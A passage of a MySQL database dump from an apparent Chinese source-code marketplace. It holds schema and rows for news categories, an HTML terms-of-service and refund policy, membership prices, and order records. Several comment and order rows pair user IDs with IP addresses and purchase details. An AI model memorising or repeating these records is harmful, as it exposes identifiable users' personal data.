(3, '1490604408n40', 0, 126, '2017-11-18 15:54:30', '123.161.25.188', '复旦李开复那里撒', '', NULL, 1),
(4, '1490604408n40', 0, 126, '2017-11-18 15:55:30', '123.161.25.188', '粉丝网飞机文件访问', '', NULL, 1),
(5, '1490603043n45', 0, 193, '2018-08-29 17:35:02', '223.157.221.28', 'dddddd', '', NULL, 1);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_newstype`
--

CREATE TABLE IF NOT EXISTS `yjcode_newstype` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name1` char(50) DEFAULT NULL,
  `name2` char(50) DEFAULT NULL,
  `admin` int(11) DEFAULT NULL,
  `xh` int(11) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=66 ;

--
-- 转存表中的数据 `yjcode_newstype`
--

INSERT INTO `yjcode_newstype` (`id`, `name1`, `name2`, `admin`, `xh`, `sj`) VALUES
(21, '升级补丁', NULL, 1, 1, '2017-07-20 14:21:16'),
(22, '技术文档', NULL, 1, 2, '2017-07-20 14:21:08'),
(23, '官方公告', NULL, 1, 3, '2017-07-20 14:20:57'),
(24, '数码/游戏/手机', NULL, 1, 4, '2014-11-17 14:21:28'),
(25, '生活百科', NULL, 1, 5, '2014-11-17 14:21:43'),
(26, '升级补丁', '本网专稿', 2, 1, '2017-03-27 16:13:07'),
(27, '升级补丁', '专题聚合', 2, 2, '2017-03-27 16:13:54'),
(28, '升级补丁', '新闻人物', 2, 3, '2017-03-27 16:14:04'),
(29, '升级补丁', '研究报告', 2, 4, '2017-03-27 16:14:12'),
(30, '升级补丁', '热点新闻', 2, 5, '2017-03-27 16:14:24'),
(31, '升级补丁', '即时新闻', 2, 6, '2017-03-27 16:14:32'),
(32, '升级补丁', '服务器应用', 2, 7, '2014-11-17 16:23:18'),
(33, '升级补丁', '互联网', 2, 8, '2014-11-17 14:22:46'),
(34, '技术文档', '科技新闻', 2, 1, '2017-03-27 16:27:07'),
(35, '技术文档', '手机新闻', 2, 2, '2017-03-27 16:27:17'),
(36, '技术文档', '通信新闻', 2, 3, '2017-03-27 16:27:29'),
(37, '技术文档', '数码新闻', 2, 4, '2017-03-27 16:27:40'),
(38, '技术文档', '应用新闻', 2, 5, '2017-03-27 16:28:21'),
(39, '技术文档', '数码评测', 2, 6, '2017-03-27 16:28:32'),
(40, '技术文档', '软件新闻', 2, 7, '2017-03-27 16:28:42'),
(42, '官方公告', '创业', 2, 1, '2014-11-17 14:24:00'),
(43, '官方公告', '股票', 2, 2, '2014-11-17 14:24:04'),
(44, '官方公告', '行业投资', 2, 3, '2014-11-17 14:24:07'),
(45, '官方公告', '理财知识', 2, 4, '2014-11-17 14:24:11'),
(46, '官方公告', '经济贸易', 2, 5, '2014-11-17 14:24:16'),
(47, '官方公告', '基金', 2, 6, '2014-11-17 14:24:19'),
(48, '官方公告', '债券', 2, 7, '2014-11-17 14:24:26'),
(49, '官方公告', '外汇', 2, 8, '2014-11-17 14:24:30'),
(50, '数码/游戏/手机', 'Andriod(安卓)', 2, 1, '2014-11-17 16:23:30'),
(51, '数码/游戏/手机', 'iOS(苹果)', 2, 2, '2014-11-17 16:23:24'),
(52, '数码/游戏/手机', '网络游戏', 2, 3, '2014-11-17 14:24:57'),
(53, '数码/游戏/手机', '网页游戏', 2, 4, '2014-11-17 14:25:01'),
(54, '数码/游戏/手机', '单机游戏', 2, 5, '2014-11-17 14:25:05'),
(55, '数码/游戏/手机', 'Windows Phone', 2, 6, '2014-11-17 14:25:09'),
(56, '数码/游戏/手机', '数码相机', 2, 7, '2014-11-17 14:25:13'),
(57, '数码/游戏/手机', '数码摄像机', 2, 8, '2014-11-17 14:25:17'),
(58, '生活百科', '养生保健', 2, 1, '2014-11-17 14:25:43'),
(59, '生活百科', '美容时尚', 2, 2, '2014-11-17 14:25:46'),
(60, '生活百科', '美食烹饪', 2, 3, '2014-11-17 14:25:50'),
(61, '生活百科', '购房置业', 2, 4, '2014-11-17 14:25:53'),
(62, '生活百科', '家居装修', 2, 5, '2014-11-17 14:25:57'),
(63, '生活百科', '家电维修', 2, 6, '2014-11-17 14:26:01'),
(64, '生活百科', '汽车保养', 2, 7, '2014-11-17 14:26:04'),
(65, '生活百科', '育儿母婴', 2, 8, '2014-11-17 14:26:08');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_onecontrol`
--

CREATE TABLE IF NOT EXISTS `yjcode_onecontrol` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `sj` datetime DEFAULT NULL,
  `tyid` int(11) DEFAULT NULL,
  `txt` longtext,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `yjcode_onecontrol`
--

INSERT INTO `yjcode_onecontrol` (`id`, `sj`, `tyid`, `txt`) VALUES
(1, '2019-01-15 16:05:18', 1, '<p><strong>尊敬的用户：您好！</strong></p><p>欢迎光临友价源码（www.yj.928vip.cn）网站（以下简称“本站”）。</p><p>用户需要同意本服务条款才能成为本站的注册用户并享受本网站所提供的各项服务。用户注册是完全免费的，继续注册前请先阅读服务条款。</p><p><br/></p><p><strong>1. 本站服务条款确认与接纳</strong></p><p>本协议是用户（您）与本站之间的协议，本站依据本协议条款为您提供服务。</p><p>1.1 本协议服务条款构成您（无论是个人或者单位）使用本站所提供服务之先决条件。如您不同意本协议服务条款或其随时对其的修改，您应不使用或主动取消本站提供的服务。您的使用行为将被视为您对本协议服务条款及其随时修改版本的完全接受；</p><p>1.2 这些条款可由本站随时更新，且毋须另行通知。修改后的服务条款一旦在本站上公布即取代替原来的服务条款，并构成本条款整体之一部分。您可随时访问本站查阅最新的服务条款。</p><p><br/></p><p><strong>2. 本站提供的服务</strong></p><p>2.1 本站向您提供包括但不限于如下服务：</p><p>（1）本站主页www.yj99.cn（含其他任何由本站直接所有或运营的任何网站）；&nbsp;</p><p>（2）本站利用直接拥有或运营的服务器、为您提供的信息网络存储空间；&nbsp;</p><p>（3）本站网站联盟（包括其他第三方网站）；&nbsp;</p><p>（4）本站提供给您的任何其他技术和/或服务。</p><p>本站仅根据您的指令，提供信息网络存储空间（或信息登记）及相关平台服务，本身不直接上传（发布）任何内容。您利用本站服务上传的内容包括但不限于文档（文字）、图片、音视频课件等，您担保对利用本站服务上传、传播的内容负全部法律责任。</p><p>2.2 您在此明确陈述并保证对所有上传、传播到本站上的内容，拥有或取得了所有必要的权利并承担全部的法律责任，包括但不限于：您有权或已取得必要的许可、授权、准许来使用或授权本站使用所有与上传作品有关的所有专利、商标、商业秘密、版权、表演者权及其他私有权利；</p><p>2.3 对所有上传至本站的内容（您在此保证已获得权利人的明确授权），您在此同意授予本站对所有上述作品和内容的在全球范围内的免费、不可撤销的、无限期的、并且可转让的非独家使用权许可；本站有权视情况展示、散布及推广前述内容，有权对前述内容进行任何形式的复制、修改、出版、发行及以其他方式使用或者授权第三方进行复制、修改、出版、发行及以其他方式使</p><p>用；<br/></p><p>2.4 本站并不担保您所有上传内容能够通过本站服务为其他用户所获取、浏览，本站没有义务和责任对所有您上传、传播的内容进行监测；但本站保留根据国家法律、法规的要求对上传、传播的内容进行不定时抽查的权利，并有权在不事先通知的情况下移除获断开链接违法、侵权的内容。此款的规定并不排除您对上传内容的版权担保，亦并非表明本站有责任及能力判断您上传内容的版权归属 。</p><p><br/></p><p><strong>3. 用户注册</strong></p><p>如果您使用本站提供的网络存储空间进行资料上传、传播服务，您需要注册一个账号、密码，并确保注册信息的真实性、正确性及完整性，如果上述注册信息发生变化，您应及时更改。在安全完成本服务的登记程序并收到一个密码及账号后，您应维持密码及账号的机密安全。您应对任何人利用您的密码及账号所进行的活动负完全的责任，本站无法对非法或未经您授权使用您账号及</p><p>密码的行为做出甄别，因此本站不承担任何责任。在此，您同意并承诺做到：<br/></p><p>3.1 当您的密码或账号遭到未获授权的使用，或者发生其他任何安全问题时，您会立即有效地通知到本站；</p><p>3.2 当您每次登录本站或使用其他相关服务后，会将有关账号等安全退出；</p><p>3.3 您同意接受本站通过电子邮件、客户端、网页或其他合法方式向您发送相关商业信息。在使用电信增值服务的情况下，您同意接受本站及其合作公司通过增值服务系统或其他方式向您发送的相关服务信息或其他信息，其他信息包括但不限于通知信息、宣传信息、广告信息等；</p><p>3.4 您承诺不在注册、使用本站账号时从事下列行为：</p><p>（1） 故意冒用他人信息为自己注册本站账号；&nbsp;</p><p>（2） 未经他人合法授权以他人名义注册本站账号；</p><p>（3） 使用侮辱、诽谤、色情等违反公序良俗的词语注册本站账号。</p><p>3.5 您在此同意，本站有权根据自己的判定，对违反上述条款的用户拒绝提供账号注册或取消该账号的使用；</p><p>3.6 本站保证，您提供给本站的所有注册信息将根据本站隐私保护政策予以保密，但根据国家法律强制性要求予以披露的除外。</p><p><br/></p><p><strong>4. 用户行为与承诺</strong></p><p>您单独承担发布内容的责任。您对服务的使用是根据所有适用于服务的地方法律、国家法律和国际法律标准的。</p><p>用户承诺：</p><p>4.1 在本站的网页上发布信息或者利用本站的服务时必须符合中国有关法规，不得在本站的网页上或者利用本站的服务制作、复制、发布、传播以下信息：</p><p>（1）反对宪法所确定的基本原则的；</p><p>（2）危害国家安全，泄露国家秘密，颠覆国家政权，破坏国家统一的；</p><p>（3）损害国家荣誉和利益的；</p><p>（4）煽动民族仇恨、民族歧视，破坏民族团结的；</p><p>（5）破坏国家宗教政策，宣扬邪教和封建迷信的；</p><p>（6）散布谣言，扰乱社会秩序，破坏社会稳定的；</p><p>（7）散布淫秽、色情、赌博、暴力、凶杀、恐怖或者教唆犯罪的；</p><p>（8）侮辱或者诽谤他人，侵害他人合法权益的；</p><p>（9）煽动非法集会、结社、游行、示威、聚众扰乱社会秩序的；</p><p>（10）以非法民间组织名义活动的；</p><p>（11）含有法律、行政法规禁止的其他内容的。</p><p>4.2 不利用本站的服务从事以下活动：</p><p>（1）未经允许，进入计算机信息网络或者使用计算机信息网络资源的；</p><p>（2）未经允许，对计算机信息网络功能进行删除、修改或者增加的；&nbsp;</p><p>（3）未经允许，对进入计算机信息网络中存储、处理或者传输的数据和应用程序进行删除、修改或者增加的；</p><p>（4）故意制作、传播计算机病毒等破坏性程序的；</p><p>（5）其他危害计算机信息网络安全的行为。</p><p>4.3 遵守本站的所有其他规定和程序。</p><p><br/></p><p><strong>5. 隐私保护</strong></p><p>当您注册本站的服务时，您须提供个人信息。本站收集个人信息的目的是为您提供尽可能多的个人化网上服务。本站不会在未经合法获得您授权时，公开、编辑或透露您的个人信息及保存在本站中的非公开内容，除非有下列情况：</p><p>（1）有关法律规定或本站合法服务程序规定；&nbsp;</p><p>（2）在紧急情况下，为维护您及公众的权益；&nbsp;</p><p>（3）为维护本站的商标权、专利权及其他任何合法权益；</p><p>（4）其他依法需要公开、编辑或透露个人信息的情况。</p><p><br/></p><p><strong>6. 免责声明</strong></p><p>6.1本站本身不直接上传、发布任何包括但不限于文档（文字）、图片、音视频课件等内容。所有内容均由用户上传、发布，本站合理信赖内容上传（发布）者是原创作者或是已经征得著作权人的同意并与著作权人就相关问题做出了妥善处理。内容上传（发布）者担保对利用本站服务上传、传播的内容负全部法律责任，本站不负担任何责任。</p><p>6.2 本网站发布的各类数字产品文档，访问者在本网站发表的观点以及以链接形式推荐的其他网站内容，仅为提供更多信息以参考使用或者学习交流，并不代表本网站观点，也不构成任何销售建议。</p><p>6.3以下情形导致的个人信息泄露，本站免责：&nbsp;</p><p>（1）政府部门、司法机关等依照法定程序要求本站披露个人资料时，本站将根据执法单位之要求或为公共安全之目的提供个人资料；&nbsp;</p><p>（2）由于用户将个人密码告知他人或与他人共享注册账户，由此导致的任何个人资料泄露；&nbsp;</p><p>（3）任何由于计算机问题、黑客攻击、计算机病毒侵入或发作、因政府管制而造成的暂时性关闭等影响网络正常经营的不可抗力而造成的个人资料泄露、丢失、被盗用或被窜改等；&nbsp;</p><p>（4）由于与本站链接的其他网站所造成之个人资料泄露；&nbsp;</p><p>6.4 本站若因线路及本站控制范围外的硬件故障或其它不可抗力而导致暂停服务，暂停服务期间给用户造成的一切损失，本站不承担任何法律责任。</p><p>6.5 除本站注明之服务条款外，其他一切因使用本站而引致之任何意外、疏忽、诽谤、版权或知识产权侵犯及其所造成的损失（包括因下载而感染电脑病毒），本站不承担任何法律责任。&nbsp;</p><p>6.6 为方便您使用，本站服务可能会提供与第三方国际互联网网站或资源进行链接。除非另有声明，本站无法对第三方网站服务进行控制，您因使用或依赖上述网站或资源所产生的损失或损害，本站不负担任何责任。</p><p><br/></p><p><strong>7. 版权政策</strong></p><p>本站根据用户指令提供内容上传、传播的信息网络存储空间，我们充分尊重原创作者的著作权和知识产权。根据《中国人民共和国版权法》、《信息网络传播权保护条例》、《互联网著作权行政保护办法》等相关法律、法规的规定，本站针对网络侵权采取如下版权政策：</p><p>（1）本站对网络版权保护尽合理、审慎的义务，在有理由确信有任何明显侵犯任何第三人版权的内容存在时，有权不事先通知随时删除该侵权内容；</p><p>（2）在接到符合法定要求的版权通知时，迅速删除涉嫌侵权内容；</p><p>（3）采取必要的技术措施，尽量防止相同侵权内容的再次上传；</p><p>（4）对有证据证明反复上传侵权内容的用户随时停止提供网络存储空间的技术服务和信息发布服务。</p><p><br/></p><p><strong>8. 服务终止</strong></p><p>8.1 您同意本站有权基于其自行之考虑，因任何理由，包括但不限于缺乏使用或本站认为您已经违反本协议的文字及精神，而终止您的账号或服务之全部或任何部分，并将您在本站的服务内的任何内容加以移除并删除；</p><p>8.2 您同意依本协议任何规定提供之服务，无需进行事先通知即可中断或终止，您承认并同意，本站可立即关闭或删除您的账号及您账号中所有相关信息及文件，及/或禁止继续使用前述文件或本站的服务。</p><p>此外，您同意若本站的服务之使用被中断、终止或您的账号及相关信息和文件被关闭、删除，本站对您或任何第三人均不承担任何责任。</p><p><br/></p><p><strong>9. 其他</strong></p><p>请确认您已仔细阅读了本服务条款，接受本站服务条款全部内容，成为本站的正式用户。用户在享受本站服务时必须完全、严格遵守本服务条款。&nbsp;</p><p>本服务条款的所有解释权归本站所有。</p>'),
(2, '2017-04-09 14:47:24', 2, '<p>关于我们资料正在整理中...</p>'),
(3, '2014-11-19 14:38:48', 3, '<p>广告合作资料正在整理中……</p>'),
(4, '2014-10-26 12:05:39', 4, '<p>联系我们资料正在整理中……</p>'),
(5, '2014-10-26 12:05:45', 5, '<p>隐私条款资料正在整理中……</p>'),
(6, '2014-10-26 12:05:51', 6, '<p>免责声明资料正在整理中……</p>'),
(7, '2014-10-30 16:58:10', 7, '<p>开店协议资料整理中……</p>'),
(8, '2014-11-02 14:00:30', 8, '<p>商品发布条款正在整理中</p>'),
(9, '2017-08-16 17:11:46', 9, '<p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><img src="http://shopt5.yj99.cn/config/ueditor/php/upload/70521461640083.gif" title="1.gif" style="margin: 0px 0px 10px; padding: 0px; max-width: 898px; float: none;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><img src="http://shopt5.yj99.cn/config/ueditor/php/upload/84301461640083.jpg" title="1.jpg" style="margin: 0px auto; padding: 0px; max-width: 898px; float: none;"/><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><img src="http://shopt5.yj99.cn/config/ueditor/php/upload/41531461640083.gif" title="2.gif" style="margin: 0px 0px 10px; padding: 0px; max-width: 898px; float: none;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">1、自动：在上方保障服务中标有自动发货的商品，拍下后，将会自动收到来自卖家的商品获取（下载）链接；<br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">2、手动：未标有自动发货的的商品，拍下后，卖家会收到邮件、短信提醒，也可通过QQ或订单中的电话联系对方。</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><img src="http://shopt5.yj99.cn/config/ueditor/php/upload/40501461640083.gif" title="3.gif" style="margin: 0px 0px 10px; padding: 0px; max-width: 898px; float: none;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">1、描述：源码描述(含标题)与实际源码不一致的（例：描述PHP实际为ASP、描述的功能实际缺少、版本不符等）；<br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">2、演示：有演示站时，与实际源码小于95%一致的（但描述中有&quot;不保证完全一样、有变化的可能性&quot;类似显著声明的除外）；</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">3、发货：手动发货源码，在卖家未发货前，已申请退款的；</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">4、服务：卖家不提供安装服务或需额外收费的（但描述中有显著声明的除外）；</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">5、其他：如质量方面的硬性常规问题等。</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><span style="margin: 0px auto; padding: 0px; color: rgb(247, 150, 70);">注：经核实符合上述任一，均支持退款，但卖家予以积极解决问题则除外。交易中的商品，卖家无法对描述进行修改！</span></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;"><img src="http://shopt5.yj99.cn/config/ueditor/php/upload/69921461640083.gif" title="4.gif" style="margin: 0px 0px 10px; padding: 0px; max-width: 898px; float: none;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">1、在未拍下前，双方在QQ上所商定的内容，亦可成为纠纷评判依据（商定与描述冲突时，商定为准）；<br style="margin: 0px auto; padding: 0px;"/></p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">2、在商品同时有网站演示与图片演示，且站演与图演不一致时，默认按图演作为纠纷评判依据（特别声明或有商定除外）；</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">3、在没有&quot;无任何正当退款依据&quot;的前提下，写有&quot;一旦售出，概不支持退款&quot;等类似的声明，视为无效声明；</p><p style="margin-top: 2pt; margin-bottom: 0px; padding: 0px; font-family: &#39;Microsoft YaHei&#39;, 微软雅黑, MicrosoftJhengHei, 华文细黑, STHeiti, MingLiu; font-size: 14px; line-height: 24px; white-space: normal;">4、虽然交易产生纠纷的几率很小，但请尽量保留如聊天记录这样的重要信息，以防产生纠纷时便于网站工作人员介入快速处理。</p><p><br/></p>');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_openyue`
--

CREATE TABLE IF NOT EXISTS `yjcode_openyue` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `yue` int(10) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=FIXED AUTO_INCREMENT=67 ;

--
-- 转存表中的数据 `yjcode_openyue`
--

INSERT INTO `yjcode_openyue` (`id`, `yue`, `money1`) VALUES
(65, 6, 500),
(66, 12, 1000);

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_order`
--

CREATE TABLE IF NOT EXISTS `yjcode_order` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `probh` char(50) DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `fhsj` datetime DEFAULT NULL,
  `oksj` datetime DEFAULT NULL,
  `uip` char(40) DEFAULT NULL,
  `selluserid` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `money1` float DEFAULT NULL,
  `orderbh` char(50) DEFAULT NULL,
  `num` int(11) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `ddzt` char(15) DEFAULT NULL,
  `tksj` datetime DEFAULT NULL,
  `tkly` text,
  `tkjg` varchar(250) DEFAULT NULL,
  `tkoksj` datetime DEFAULT NULL,
  `txt` text,
  `tcv` varchar(200) DEFAULT NULL,
  `buyform` text,
  `tcid` int(10) DEFAULT NULL,
  `fhxs` int(10) DEFAULT NULL,
  `kdid` int(10) DEFAULT NULL,
  `kddh` char(50) DEFAULT NULL,
  `shdz` varchar(250) DEFAULT NULL,
  `yunfei` int(10) DEFAULT '0',
  `liuyan` text,
  `closesj` datetime DEFAULT NULL,
  `ycshsj` datetime DEFAULT NULL,
  `ifpj` int(10) DEFAULT NULL,
  `fhtxt` text,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=48 ;

--
-- 转存表中的数据 `yjcode_order`
--

INSERT INTO `yjcode_order` (`id`, `probh`, `sj`, `fhsj`, `oksj`, `uip`, `selluserid`, `userid`, `money1`, `orderbh`, `num`, `tit`, `ddzt`, `tksj`, `tkly`, `tkjg`, `tkoksj`, `txt`, `tcv`, `buyform`, `tcid`, `fhxs`, `kdid`, `kddh`, `shdz`, `yunfei`, `liuyan`, `closesj`, `ycshsj`, `ifpj`, `fhtxt`) VALUES
(30, '1554036529-15', '2019-04-03 09:42:08', NULL, NULL, '61.151.178.176', 15, 239, 600, '1554255728099', 1, '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(31, '1554036529-15', '2019-04-11 18:15:50', NULL, NULL, '219.134.217.48', 15, 241, 600, '1554977750065', 1, '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(32, '1554034828-15', '2019-04-25 10:49:42', NULL, NULL, '183.205.179.2', 15, 847, 400, '1556160582068', 1, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(33, '1557221794-15', '2019-05-12 01:19:38', NULL, NULL, '223.157.119.76', 15, 14, 30, '1557595178028', 1, 'discuz克米设计APP手机版v3.5送15套配套插件教程分类信息dz模板', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(34, '1554700535-15', '2019-05-12 01:21:16', NULL, NULL, '223.157.119.76', 15, 14, 200, '1557595276090', 1, '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(35, '1554700535-15', '2019-05-12 01:24:31', NULL, NULL, '223.157.119.76', 15, 14, 200, '1557595471084', 1, '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(36, '1554700535-15', '2019-05-12 01:29:35', '2019-05-12 01:29:35', '2019-05-13 15:46:01', '223.157.119.76', 15, 14, 200, '1557595775070', 1, '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', 'suc', NULL, NULL, NULL, NULL, '', '', '', 0, 2, NULL, NULL, '', 0, '', NULL, NULL, 1, NULL),
(37, '1554035499-15', '2019-05-13 13:44:58', NULL, NULL, '42.236.177.24', 15, 953, 150, '1557726298020', 1, '友价源码t5抢先更新买程序赠送会员生成插件3月7日', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(38, '1554034828-15', '2019-05-13 14:52:52', NULL, NULL, '42.236.177.24', 15, 953, 100, '1557730372065', 1, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '红色 中码', '', 68, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(39, '1554034828-15', '2019-05-13 15:41:18', NULL, NULL, '42.236.177.24', 15, 955, 100, '1557733278058', 1, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '红色 中码', '', 68, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(40, '1554035561-15', '2019-05-13 15:42:24', NULL, NULL, '42.236.177.24', 15, 955, 150, '1557733344078', 1, '多城市房产程序 开源房产源码Thinkphp多城市版站群版', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(41, '1554700535-15', '2019-05-13 15:42:24', '2019-05-13 15:42:24', '2019-05-16 00:28:47', '42.236.177.24', 15, 955, 200, '1557733344179', 1, '友价源码t5抢先更新买程序赠送会员生成插件3月7日增加熊掌号自动推送插件', 'suc', NULL, NULL, NULL, NULL, '', '', '', 0, 2, NULL, NULL, '', 0, '', NULL, NULL, 1, NULL),
(42, '1554034828-15', '2019-05-13 15:45:20', NULL, NULL, '42.236.177.24', 15, 955, 100, '1557733520043', 5, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '尺码', '', 67, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(43, '1554034828-15', '2019-06-06 16:03:45', NULL, NULL, '111.226.203.167', 15, 961, 100, '1559808225040', 1, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '红色 中码', '', 68, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(44, '1554034828-15', '2019-06-07 23:45:49', NULL, NULL, '49.74.37.184', 15, 962, 100, '1559922349099', 1, '新站网，友价源码商城带数据打包出售3月份打包的', 'wait', NULL, NULL, NULL, NULL, '', '红色 中码', '', 68, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
(45, '1554036529-15', '2019-06-16 23:48:04', NULL, NULL, '106.58.231.149', 15, 967, 600, '1560700084061', 1, '整站带数据网络工作室个人博客资源下载商城系统源码自适应手机', 'wait', NULL, NULL, NULL, NULL, '', '', '', 0, 1, NULL, NULL, '', 0, '', NULL, NULL, NULL, NULL),
